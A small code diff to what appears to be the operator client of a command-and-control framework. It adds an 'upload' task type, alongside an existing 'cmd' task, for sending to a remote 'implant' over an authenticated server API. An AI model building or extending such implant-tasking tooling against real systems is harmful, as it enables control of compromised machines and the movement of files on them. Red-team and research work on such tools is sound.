@@ -150,6 +150,10 @@ def main():
                     elif args.task_type == 'cmd':
                         args.command = input("Enter the command to run:\n>> ").strip()
                         post_task(args.server_url, args.implant_id, args.task_type, args.command, access_token)
+                    elif args.task_type == 'upload':
+                        args.file_path = input("Enter the file path to upload:\n>> ").strip()
+                        post_task(args.server_url, args.implant_id, args.task_type, args.file_path, access_token)
+                        
                     
             elif args.action == 'results':
                 if access_token:
